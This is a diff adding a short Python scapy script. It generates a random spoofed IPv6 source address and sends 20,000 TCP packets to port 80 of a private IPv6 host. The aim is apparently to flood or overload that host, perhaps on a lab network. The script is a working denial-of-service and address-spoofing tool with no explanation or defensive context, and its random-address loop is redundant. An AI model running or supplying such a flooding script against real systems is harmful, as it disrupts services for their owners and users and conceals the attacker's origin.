@@ -1,0 +1,14 @@
+#!/usr/bin/python3
+from random import getrandbits
+from ipaddress import IPv6Network, IPv6Address
+from scapy.all import *
+
+for x in range(0, 100):
+	prefix = '0:0:0:0:0:0:0:0' 
+
+	network = IPv6Network(prefix)
+	address = IPv6Address(network.network_address + getrandbits(network.prefixlen))
+	address = str(address)
+print (address)
+
+send (IPv6(src = address, dst = "FD80:1234:5678:2::254")/TCP (sport=333, dport=80), count=20000)
